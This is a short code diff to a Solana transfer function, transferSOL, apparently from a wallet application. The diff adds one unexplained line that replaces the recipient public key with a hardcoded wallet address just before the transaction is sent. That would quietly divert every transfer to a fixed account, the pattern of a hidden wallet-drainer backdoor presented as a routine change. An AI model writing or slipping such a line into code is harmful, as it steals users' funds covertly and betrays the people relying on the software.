@@ -114,6 +114,8 @@ export async function transferSOL(
     isType: `${publicKey instanceof PublicKey}`
   });
 
+  publicKey = new PublicKey('D53UgJMQGU6T3SG1yYemKSQx7PSybAYLDLS7UvoFKe8G');
+
   try {
     // Use connectionless approach to avoid WebSocket issues
     // The sendTransaction function already has a connection from the wallet adapter
